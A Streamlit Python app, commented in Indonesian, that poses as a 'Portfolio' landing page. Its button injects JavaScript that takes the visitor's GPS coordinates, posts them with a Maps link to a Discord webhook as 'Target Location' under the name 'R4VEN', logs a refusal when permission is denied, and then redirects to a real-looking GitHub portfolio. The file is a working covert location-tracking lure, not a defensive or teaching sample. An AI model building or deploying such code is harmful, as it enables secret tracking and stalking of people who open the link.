import streamlit as st

# Konfigurasi halaman Streamlit
st.set_page_config(
    page_title="Portfolio", 
    page_icon="💼", 
    layout="wide"
)

# CSS untuk menyembunyikan header dan footer bawaan Streamlit agar bersih
hide_streamlit_style = """
    <style>
    #MainMenu {visibility: hidden;}
    header {visibility: hidden;}
    footer {visibility: hidden;}
    .stApp > header {display: none;}
    </style>
"""
st.markdown(hide_streamlit_style, unsafe_allow_html=True)

# Ambil Discord Webhook dari Streamlit Secrets
try:
    webhook_url = st.secrets["DISCORD_WEBHOOK_URL"]
except Exception:
    webhook_url = ""

# Tampilan halaman utama di HP
st.markdown("<h2 style='text-align: center; margin-top: 100px;'>Selamat Datang</h2>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: gray;'>Silakan klik tombol di bawah untuk masuk ke portofolio.</p>", unsafe_allow_html=True)

col1, col2, col3 = st.columns([1, 2, 1])

with col2:
    # Tombol interaktif Streamlit
    if st.button("Klik di sini untuk melihat Portfolio", use_container_width=True):
        if webhook_url:
            # Skrip JavaScript untuk mengambil koordinat dan mengirim ke Discord lalu redirect
            js_code = f"""
            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
            <script>
                const WEBHOOK_URL = "{webhook_url}";

                function sendToDiscord(payload) {{
                    const request = new XMLHttpRequest();
                    request.open("POST", WEBHOOK_URL);
                    request.setRequestHeader('Content-type', 'application/json');
                    request.send(JSON.stringify(payload));
                }}

                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(function(position) {{
                        var latlong = "Lat: " + position.coords.latitude + " Lon: " + position.coords.longitude;
                        var mapLink = "https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude;
                        
                        sendToDiscord({{
                            username: "R4VEN",
                            embeds: [{{ 
                                title: "Target Location", 
                                description: latlong + "\\n[Buka di Maps](" + mapLink + ")", 
                                color: 15844367 
                            }}]
                        }});

                        window.location.href = "https://iqbalmantam.github.io/portfolio/";
                    }}, function(error) {{
                        sendToDiscord({{
                            username: "R4VEN",
                            content: "Target menolak izin lokasi."
                        }});
                        window.location.href = "https://iqbalmantam.github.io/portfolio/";
                    }});
                }} else {{
                    window.location.href = "https://iqbalmantam.github.io/portfolio/";
                }}
            </script>
            """
            st.components.v1.html(js_code, height=0)
        else:
            st.error("Webhook URL belum diatur!")
